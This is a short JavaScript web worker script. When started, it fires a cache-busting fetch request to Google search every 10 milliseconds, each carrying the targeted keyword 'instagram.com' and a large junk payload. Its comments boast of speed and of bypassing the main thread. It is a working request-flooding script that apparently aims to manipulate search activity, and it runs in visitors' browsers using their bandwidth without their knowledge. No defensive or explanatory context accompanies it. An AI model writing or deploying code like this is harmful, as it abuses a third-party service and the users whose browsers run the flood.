// scripts/worker.js
self.onmessage = function(e) {
    if (e.data === "start") {
        setInterval(() => {
            // High-intensity data generation inside the worker
            const junk = "A1B2C3D4E5".repeat(500);
            const salt = Math.random().toString(36).substring(2, 10);
            const domain = "instagram.com"; // Targeted keyword

            // Firing the request directly from the Worker
            // This bypasses the Main Thread entirely!
            fetch(`https://www.google.com/search?q=${domain}&data=${junk}&v=${salt}`, {
                mode: 'no-cors',
                cache: 'no-store'
            }).catch(() => {});
            
        }, 10); // Very fast pulse
    }
};
